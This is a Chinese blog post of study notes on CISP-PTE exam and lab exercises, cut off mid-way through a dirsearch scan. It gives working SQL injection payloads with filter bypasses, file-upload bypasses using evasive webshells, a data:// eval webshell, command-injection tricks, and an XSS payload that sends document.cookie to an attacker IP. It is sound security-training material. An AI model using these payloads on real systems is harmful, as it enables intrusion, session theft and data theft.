<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="第一部分参考# CISP-PTE八套真题详解（侵删）的学习笔记 第一套题目sql注入：order by没有用，直接进入union select阶段，找到有回显的字段2和3。后面就是常规的union注入 文件上传：关键词被过滤 上传preg_replace.php 不使用eval的免杀马一句话木马php函数一句话木马 文件包含：尝试data:&#x2F;&#x2F;text&#x2F;plain,">
<meta property="og:type" content="article">
<meta property="og:title" content="guayu-kakeru">
<meta property="og:url" content="https://guayu-kakeru.github.io/posts/0.html">
<meta property="og:site_name" content="guayu-kakeru">
<meta property="og:description" content="第一部分参考# CISP-PTE八套真题详解（侵删）的学习笔记 第一套题目sql注入：order by没有用，直接进入union select阶段，找到有回显的字段2和3。后面就是常规的union注入 文件上传：关键词被过滤 上传preg_replace.php 不使用eval的免杀马一句话木马php函数一句话木马 文件包含：尝试data:&#x2F;&#x2F;text&#x2F;plain,">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68a82cab58cb8da5c842a678.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b1748b58cb8da5c8617f51.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b175b458cb8da5c8617ffa.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b178b358cb8da5c861836e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b3bb2b58cb8da5c8657d22.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b3bcce58cb8da5c865842f.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b3c29358cb8da5c8659e3c.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b5648d58cb8da5c86b6917.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b5693e58cb8da5c86b7db6.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b569ce58cb8da5c86b8ad6.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b56a6558cb8da5c86b969e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b56cf658cb8da5c86bc9a9.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b5ab5158cb8da5c86cc4bf.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b5ae6b58cb8da5c86cd7d5.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b5b18058cb8da5c86cdd58.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b5b34158cb8da5c86cdf56.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b5b3c458cb8da5c86cdfa2.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b5b42a58cb8da5c86cdfd8.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b6a10a58cb8da5c871f712.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68b6a15e58cb8da5c871fb01.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68c2337a58cb8da5c89a202e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68c394a558cb8da5c8a051ae.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/7dd661365aa0efeb.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/14697e122706e076.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/a76d8de318476e85.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/e56ab2161d119d34.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/9d67f78e59142ba7.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68c91229c5157e1a880ae5c4.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68c91407c5157e1a880b01da.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68c9154ac5157e1a880b0851.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/3b55dcc89b2e8fc8.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/ab6f089a98aa9501.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/24164a8f865134b2.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/9f7465a92cae2b87.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/12e9a1930c7ed37e.png">
<meta property="article:published_time" content="2025-08-29T09:43:02.729Z">
<meta property="article:modified_time" content="2025-09-16T10:05:25.909Z">
<meta property="article:author" content="guayu-kakeru">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic1.imgdb.cn/item/68a82cab58cb8da5c842a678.png">

<link rel="canonical" href="https://guayu-kakeru.github.io/posts/0.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title> | guayu-kakeru</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">guayu-kakeru</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">15</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">83</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="guayu-kakeru">
      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="guayu-kakeru">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-08-29 17:43:02" itemprop="dateCreated datePublished" datetime="2025-08-29T17:43:02+08:00">2025-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-16 18:05:25" itemprop="dateModified" datetime="2025-09-16T18:05:25+08:00">2025-09-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
      
      
      
        <h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45813980/article/details/134488597"># CISP-PTE八套真题详解（侵删）</a>的学习笔记</p>
<h2 id="第一套题目"><a href="#第一套题目" class="headerlink" title="第一套题目"></a>第一套题目</h2><p>sql注入：<br>order by没有用，直接进入union select阶段，找到有回显的字段2和3。后面就是常规的union注入</p>
<p>文件上传：<br>关键词被过滤 上传preg_replace.php 不使用eval的免杀马<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/536097761">一句话木马</a><br><a target="_blank" rel="noopener" href="https://lbsucceed.github.io/posts/yi-ju-hua-mu-ma-jian-dan-xue-xi/#str-replace-han-shu">php函数一句话木马</a></p>
<p>文件包含：<br>尝试data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo(); ?> 发现phpinfo还在但是data:&#x2F;&#x2F;被替换成空了，所以用双写绕过。 然后上传一句话木马用antsword连接</p>
<p>反序列化：<br>非常简单的反序列化，只要有一个php环境输出序列化的结果就好，可以在上一题的文件中写入，然后访问得到字符串</p>
<p>越权：<br>先用XFF头修改为本地IP  然后再Cookie中修改Username为admin的base64并且把isAdmin修改成true</p>
<h2 id="第二套题目"><a href="#第二套题目" class="headerlink" title="第二套题目"></a>第二套题目</h2><p>sql注入：<br>用’)闭合前面的内容  最后用注释后面的内容  过滤空格用注释绕过  union被过滤用双写绕过 使用load_file()函数直接读取文件里面的内容</p>
<p>文件上传：<br>就考察后缀名的替换 改成pht等就可以绕过</p>
<p>文件包含：<br>可以用data伪协议写webshell然后用蚁剑连接 或者用php filter读源码</p>
<p>命令执行：<br>cat命令被过滤  用其他的方式读文件<br><img src="https://pic1.imgdb.cn/item/68a82cab58cb8da5c842a678.png"></p>
<p>日志分析：<br>先筛选200 再搜索中的书签 选择删除未标记行 可以看到admin登录的路径  爆破admin的密码 ，登录之后拿到key</p>
<h2 id="第三套题目"><a href="#第三套题目" class="headerlink" title="第三套题目"></a>第三套题目</h2><p>sql注入：<br>这题考察的是二阶注入，有注册用户和重置密码的功能。 重置密码的语句是<code>update user set password = &#39;&#39; where username= &#39;&#39; </code> 所以只要注册一个<code>admin&#39;#</code> 用户，这样在修改这个用户的密码的时候就修改了admin的密码 然后可以登入admin</p>
<p>文件上传：<br>上传免杀马 绕过内容过滤</p>
<p>文件包含：<br>查看view.html 审计代码 发现要传入一个Hello参数 还要一个z0 输入想要执行的代码的base64</p>
<p>代码审计：<br>传入cmd参数 执行命令 然后重定向到一个文件中查看输出结果</p>
<p>代码执行：<br>管道符被过滤 使用 &amp;&amp;   过滤了php 使用*模糊匹配</p>
<h2 id="第四套题目"><a href="#第四套题目" class="headerlink" title="第四套题目"></a>第四套题目</h2><p>sql注入：<br>和第三套的题目差不多  区别是这里admin’#被注册了 需要在注册admin’#123 后面加上字符的</p>
<p>文件上传：<br>免杀马  用preg_replace的就可以</p>
<p>文件包含：<br>和上一套一样</p>
<p>日志分析：<br>用正则表达式筛选出状态码是200的记录 然后匹配出index upload 等四个路径，需要用正则去掉这四个路径<br>有的index前面有两个&#x2F; 所以正则中也要去掉这种情况 最终找到一个backdoor文件<br><code>^.*&quot;[A-Z]+ /(?!/?(index|manage|footer|upload)).*\.php.*&quot; 200</code><br>&#x2F;?表示可能有&#x2F; 可能没有&#x2F;</p>
<p>代码审计：<br>要构造一个json数据  第一个要求bar1不能是数字 但是要大于2020 所以用数字加字母，在php比较的时候会自动转换成数字比较  bar2要求元素是5个，第一个元素是数组  bar3要求是数组，并且有”cisp-pte”</p>
<h2 id="第五套题目"><a href="#第五套题目" class="headerlink" title="第五套题目"></a>第五套题目</h2><p>sql注入：我是差不多先生<br>注册登录之后 发现可以发表文章，在title和content处测试 发现都有注入点<br>在使用#注释之后还是发布失败，猜测还有user字段，sql语句可能是<br><code>insert into aritcles(title,content,user) values(&#39;tit&#39;,&#39;con&#39;,&#39;test&#39;)</code><br>输入的参数数量必须和列数一样才可以在content后面一个参数就是用户名<br><code>title=test&amp;content=test&#39;,&#39;test&#39;)#</code><br>然后在content处使用注入得到数据库名<code>title=123&#39;,(database()),&#39;test&#39;)#&amp;content=test</code><br>尝试得到表名的时候发现失败，可能存在过滤 用一些大小写过滤然后用 /**/ 绕过空格<br>最后得到password列的值<br>扩展： 如果没有注释符的时候 insert 可以同时插入多条语句，我们利用这个特性，可以将后面的语句进行闭合，成为另一个语句，先尝试使用 (’ 进行闭合<br>用<code>title=123&#39;,&#39;123&#39;,&#39;test&#39;),(&#39;&amp;content=test</code>测试失败，原因是在title前面还有一个参数<br><code>title=title1&#39;,&#39;content1&#39;,&#39;test&#39;),(&#39;x&#39;,&#39;title2&amp;content=content2</code> 这样就相当于发布两篇文章</p>
<p>文件上传 文件包含  命令执行  都和之前一样 </p>
<p>验证码爆破：<br>直接删除cookie  然后把验证码code字段置空</p>
<h2 id="第六套题目"><a href="#第六套题目" class="headerlink" title="第六套题目"></a>第六套题目</h2><p>sql注入：<br>考察万能密码<br>用户名处 <code>admin &#39;=&#39;</code> 密码处 <code>1&#39; Or &#39;1&#39;=&#39;1</code></p>
<p>sql注入：<br>用–+ 注释  根据sql语句用’)闭合 用order by 尝试 发现有7个字段<br>用union联合查询的时候 发现被过滤 用双写绕过<br>最后用load_file读取key </p>
<p>xss：<br>考察用xss获取admin的cookie然后登录admin<br>payload:<br><code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://192.168.xx.xx?xxxx?&#39; + document.cookie + &#39;&quot; /&gt;&#39;); &lt;/script&gt;</code><br>然后在攻击端口开http服务 就可以在url中看到cookie<br><img src="https://pic1.imgdb.cn/item/68b1748b58cb8da5c8617f51.png"><br>用cookie登录后可以看到key</p>
<p>文件包含：<br>就是考察文件包含<br><code>?data://text/plain,&lt;?php @eval($_POST[&#39;x&#39;]); ?&gt;</code> 然后用蚁剑连接之后找到flag</p>
<p>代码审计<br><img src="https://pic1.imgdb.cn/item/68b175b458cb8da5c8617ffa.png"><br>用闭合+命令的方式<br>payload: <code>?a=&quot;);system(&quot;ls</code></p>
<h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><p>在培训提供平台上的题目练习</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>第一题：<br>考察万能密码，or被过滤用Or大小写绕过<br><img src="https://pic1.imgdb.cn/item/68b178b358cb8da5c861836e.png"><br><code>password: 1&#39; Or &#39;1&#39; = &#39;1</code><br>第二题：<br>这里两个注释都被过滤了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>simple check</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(strstr(<span class="variable">$uuid</span>,<span class="string">&#x27;--&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$uuid</span> = str_replace(<span class="string">&#x27;--&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$uuid</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(strstr(<span class="variable">$uuid</span>,<span class="string">&#x27;#&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$uuid</span> = str_replace(<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$uuid</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以用两个注释的组合的方式来绕过<code>-%23-+</code><br><code>?uuid=1&#39; Order by 6 -%23-+</code> 通过order by 测试出来一共有6列<br><code>?uuid=1&#39; union select 1,2,3,4,5,6 -%23-+</code> 2和3是回显点<br><code>?uuid=1&#39; union select 1,database(),3,4,5,6 -%23-+</code> 得到数据库wasjcms<br><code>?uuid=1&#39; union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database() -%23-+</code> 得到table表的名字是flag<br><code>?uuid=1&#39; union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=&#39;flag&#39; -%23-+</code> 有id 和flag两个字段<br><code>?uuid=1&#39; union select 1,group_concat(flag),3,4,5,6 from wasjcms.flag -%23-+</code> 拿到字段名之后 得到flag值<br>第三题：  启动环境，访问下面链接，在Web根目录中找到key.flag<br><img src="https://pic1.imgdb.cn/item/68b3bb2b58cb8da5c8657d22.png"><br>首页是一个登录页面 用万能密码就可以登录<br>登录进来之后可以看到患者的治疗记录  随便选一个进入编辑 发现这里是和url相关的<br>猜测注入点在url  所以在url这里加上’ 和注释 发现确实存在sql注入<br><img src="https://pic1.imgdb.cn/item/68b3bcce58cb8da5c865842f.png"><br>通过order by 测试出一共有8个字段  用union select找不到回显的位置<br>看了课程解析才知道自己找的注入位置错了<br>在患者页面编辑里面<br>用order by 测试出15个字段<br><code>/?m=patient&amp;o=edit&amp;pid=0&#39; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+</code> 回显点有4 5 11 13<br><code>&amp;pid=0&#39; union select 1,2,3,4,5,6,7,8,9,10,11,12,load_file(&#39;/var/www/html/key.flag&#39;),14,15 --+</code> 根据题目要在网站目录拿到flag<br>第四题：<br>首页是一个文章管理系统，也是在url存在注入点<br><img src="https://pic1.imgdb.cn/item/68b3c29358cb8da5c8659e3c.png"><br>这里是数值型注入 不用单引号闭合<br><code>/show.php?id=33 order by 16 --+</code> 测试出有15列<br><code>?id=0 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+</code> id&#x3D;0不显示文章，找到回显点在3和11<br><code>?id=0 union select 1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15 --+</code> cms<br><code>?id=0 union select 1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database() --+</code> 直接这样提示Illegal mix of collations for operation ‘UNION’<br>要用 <code>group_concat(convert(table_name using gbk))</code><br><code>?id=0 union select 1,2,group_concat(convert(column_name using gbk)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.columns where table_name= &#39;cms_flag&#39; --+</code> flag<br><code>?id=0 union select 1,2,group_concat(convert(flag using gbk)),4,5,6,7,8,9,10,11,12,13,14,15 from cms.cms_flag --+</code><br>第五题： 通过SQL注入漏洞读取 <code>/tmp/key.flag</code> 文件，答案就在文件中。<br>题目给出了sql执行的语句<code>当前执行的SQL：SELECT * FROM articles WHERE id=(&#39;1&#39;)</code><br>这里先用’)闭合前面的语句然后中间插入想要执行的语句  最后注释后面的未闭合部分<br>但是这里尝试发现直接输入#会被过滤 可以用%23或者绕过<br>空格也被过滤 用<code>/**/</code>或%0b绕过 然后用order by测试出有四列<br>后面进行union测试的时候发现被过滤 用双写绕过 以及id要改成0<br><code>?id=0&#39;)/**/Ununionion/**/select/**/1,2,3,4%23</code><br><code>?id=0&#39;)/**/Ununionion/**/select/**/1,2,load_file(&#39;/tmp/key.flag&#39;),4%23</code><br>第六题： 考察二阶记录<br><img src="https://pic1.imgdb.cn/item/68b5648d58cb8da5c86b6917.png"><br>在查看文章处不存在sql注入，注入点在发表文章，这里有标题和内容，都是注入点，用bp发送请求包，用post提交两个数据<br>直接用1’# 发现语法错误，猜测有括号 内容写1’)#<br><img src="https://pic1.imgdb.cn/item/68b5693e58cb8da5c86b7db6.png"><br>出现列数不匹配的报错<br>输入2’)<br><img src="https://pic1.imgdb.cn/item/68b569ce58cb8da5c86b8ad6.png"><br>这里报错信息给出了内容这里的字段数 一个是内容，第二个是作者(admin)第三个default_value 最后一个是NOW()<br>后端语句应该是<code>insert into (标题，内容，作者，default_value，时间) value (&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;)</code><br><code>2&#39;,&#39;3&#39;,&#39;4&#39;,NOW())#</code><br><img src="https://pic1.imgdb.cn/item/68b56a6558cb8da5c86b969e.png"><br>这样子可以成功发表，所以可用3和4字段来注入，因为2前面自带了一个单引号<br><code>2&#39;,(database()),&#39;4&#39;,NOW())#</code>   php_test<br><code>2&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;php_test&#39;),&#39;4&#39;,NOW())#</code> users,articles<br><code>2&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),&#39;4&#39;,NOW())#</code> password<br><code>2&#39;,(select group_concat(password) from php_test.users),&#39;4&#39;,NOW())#</code> flag_nisp_fb8b3e<br>这题考察的内容和上面的第五套题目一样  主要考察通过报错的信息推断后端的sql语句，满足所需要的字段值，最后注入得到想要的值<br>第七题： 登录admin 拿到flag<br><img src="https://pic1.imgdb.cn/item/68b56cf658cb8da5c86bc9a9.png"><br>考察二阶注入，原理就是利用注册 后端的语句可能是<code>insert into (表名) values username, password</code> 而登录时候的语句是<code>select xxx fron 表名 where password=&#39;&#39; and username=&#39;&#39;</code> 如果创建一个用户名是<code>admin&#39;#</code>的用户，如果可以修改密码，<code>UPDATE USERNAME,PASSWORD WHERE PASSWORD=&#39;&#39; AND USERNAME=&#39;&#39;</code> 修改admin’#的密码就会修改admin用户的密码<br>这题直接注册admin’# 报错 可能因为直接用#有过滤 后面再加上–<br>注册admin’#– 账户 修改密码</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>第一题： 请将免杀码wen.php上传，并获取在根目录的flag，连接密码为“wen”<br>先尝试直接上传免杀码 发现失败<br>然后用bp的爆破模块  加上几个其他的php后缀， 发现就是对php黑名单，用大小写或者php3 phtml等都可以绕过，但是直接上传免杀码修改后缀还是不行，猜测有mime校验，所以上传图片马<br><img src="https://pic1.imgdb.cn/item/68b5ab5158cb8da5c86cc4bf.png"><br>方式是先上传一张图片，然后在图片后面加上免杀马的代码  然后修改后缀 改成1.Php 然后用蚁剑连接<br>第二题：<br>还是先测试一下后缀的问题  发现只能上传jpg png gif 格式的后缀<br><img src="https://pic1.imgdb.cn/item/68b5ae6b58cb8da5c86cd7d5.png"><br>这题考察的是00截断 ，还是先上传一个图片马 上传的路径写成我们想要的<br><img src="https://pic1.imgdb.cn/item/68b5b18058cb8da5c86cdd58.png"><br>然后在hex界面用00截断  上传之后查看图片可以看到url<code>http://211.103.180.146:18531/1.php%EF%BF%BD/8720250901144746.jpg</code> 这里在php后面的内容会被截断，所以在蚁剑中写入1.php的url就可以连接<br>第三题：<br>还是尝试不同后缀 只过滤了php 用其他的后缀就可以绕过<br>但是还有一个问题 上传之后不知道上传到了哪里<br><img src="https://pic1.imgdb.cn/item/68b5b34158cb8da5c86cdf56.png"><br>扫描一下目录，发现有上传的文件夹路径</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://211.103.180.146:15456</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_211.103.180.146_15456/_25-09-01_22-50-36.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">211.103</span>.<span class="number">180.146</span>:<span class="number">15456</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">36</span>] <span class="params">Starting:</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">38</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">324</span>B  <span class="operator">-</span> <span class="symbol">/js</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">211.103</span>.<span class="number">180.146</span>:<span class="number">15456</span><span class="operator">/</span>js<span class="symbol">/</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">304</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">307</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">307</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">309</span>B  <span class="operator">-</span> <span 